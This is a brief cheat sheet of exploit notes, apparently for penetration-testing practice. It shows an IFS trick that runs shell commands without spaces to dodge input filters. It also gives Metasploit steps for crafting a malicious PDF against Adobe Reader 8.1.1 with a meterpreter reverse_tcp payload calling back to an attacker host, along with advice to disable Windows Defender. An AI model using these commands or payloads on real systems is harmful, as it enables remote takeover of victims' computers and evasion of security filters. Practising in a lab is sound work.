# Misc exploit

Command execution without space:

`
IFS=_;command='ls_-l';$command
`

# Exploit Adobe example:

These two combinations work on Windows 10. Make sure to turn off windows defender...
`
exploit/windows/fileformat/adobe_pdf_embedded_exe with Adobe Reader 8.1.1
exploit/windows/fileformat/adobe_libtiff with Adobe Reader 8.1.1
`
Get adobe download from: ftp://ftp.adobe.com/pub/adobe/reader/win/8.x/

Steps:
`
use exploit/windows/fileformat/adobe_libtiff 
set FILENAME sample.pdf
set PAYlOAD windows/meterpreter/reverse_tcp
set LHOST 172.17.0.2
exploit 
[COPY OVER THE PDF FILE]
use exploit/multi/handler 
`

